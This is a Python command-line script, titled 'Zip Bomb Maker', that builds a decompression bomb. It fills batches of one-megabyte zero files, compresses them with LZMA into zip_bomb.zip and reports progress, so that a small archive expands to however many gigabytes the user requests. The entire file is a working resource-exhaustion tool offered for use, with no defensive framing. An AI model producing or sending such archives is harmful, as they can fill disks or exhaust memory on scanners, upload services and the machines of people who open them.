from argparse import ArgumentParser, Namespace
from typing import Any
from os.path import isdir, join, basename
from os import makedirs, remove
from shutil import rmtree
from zipfile import ZipFile, ZIP_LZMA
from time import perf_counter_ns, time
import sys


class InputParser:
    def __init__(self):
        self._args: Namespace = None
        self._parser: ArgumentParser = None
        self._size: int = None
        self._new_file: bool = None

    @property
    def parser(self) -> ArgumentParser:
        if self._parser is not None:
            return self._parser

        self._parser = ArgumentParser(
            description='Zip Bomb Maker')
        self._parser.add_argument(
            'size',
            type=int,
            help='Size in GB')
        self._parser.add_argument(
            '--new',
            '-n',
            dest='new_file',
            action='store_true',
            help='Start a new file')

        return self._parser

    @property
    def args(self) -> dict[str, Any]:
        if self._args is not None:
            return self._args

        self._args = vars(self.parser.parse_args())
        return self._args

    @property
    def size(self) -> int:
        if self._size is not None:
            return self._size

        self._size = self.args['size']
        if self._size <= 0:
            self.parser.error('ERROR\tMust be a positive integer')

        return self._size

    @property
    def new_file(self) -> bool:
        if self._new_file is not None:
            return self._new_file

        self._new_file = self.args.get('new_file', False)
        return self._new_file


def make_new_directory(directory: str):
    if isdir(directory):
        rmtree(directory)
    makedirs(directory)


def batches_of(value: int, batch_size: int):
    start = 1
    while start <= value:
        end = min(start + batch_size - 1, value)
        yield tuple(range(start, end + 1))
        start = end + 1


def create_files(files: list[str]):
    for file in files:
        with open(file, 'w') as f:
            f.write('\0' * (1024 ** 2))


def add_to_archive(files: list[str], archive: str):
    with ZipFile(archive, 'a', compression=ZIP_LZMA,
                 compresslevel=9) as zipf:
        for file in files:
            zipf.write(file, basename(file))


def delete_files(files: list[str]):
    for file in files:
        remove(file)


def format_seconds(raw_seconds: float) -> str:
    hours, remainder = map(int, divmod(raw_seconds, 3600))
    minutes, seconds = map(int, divmod(remainder, 60))
    return f'{hours:02d}h:{minutes:02d}m:{seconds:02d}s'


def print_progress_bar(completed: int, total: int,
                       elapsed_time: int = None):
    length = 50
    progress = int(length * completed / total)
    bar = "[" + "#" * progress + "-" * (length - progress) + "]"
    percentage = int(100 * completed / total)

    if completed == 0:
        print(f"INFO\t{bar} {percentage}% "
              f"({completed}/{total})", end="\r")
        return

    time_left = elapsed_time * ((total - completed) / completed)
    print(f"INFO\t{bar} {percentage}% "
          f"{format_seconds(time_left)} "
          f"({completed}/{total})", end="\r")


def build_archive(input_parser: InputParser):
    num_files = input_parser.size * (1024)
    print(f'INFO\tNumber of files: {num_files}')

    temp_directory = 'files'
    make_new_directory(temp_directory)

    output_directory = 'output'
    if input_parser.new_file:
        make_new_directory(output_directory)
    archive = join(output_directory, 'zip_bomb.zip')

    batches = list(batches_of(num_files, 256))
    print_progress_bar(0, len(batches))

    start_time = time()
    for i, batch in enumerate(batches):
        files = [join(temp_directory,
                      f'{int(perf_counter_ns())}')
                 for _ in batch]

        create_files(files)
        add_to_archive(files, archive)
        delete_files(files)

        print_progress_bar(i + 1, len(batches),
                           elapsed_time=int(time() - start_time))

    rmtree(temp_directory)
    print()


def main():
    input_parser = InputParser()
    try:
        build_archive(input_parser)
    except Exception as e:
        input_parser.parser.error(f'\nERROR\t{str(e)}')


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\nERROR\tProgram interruped. Exiting...')
        sys.exit()
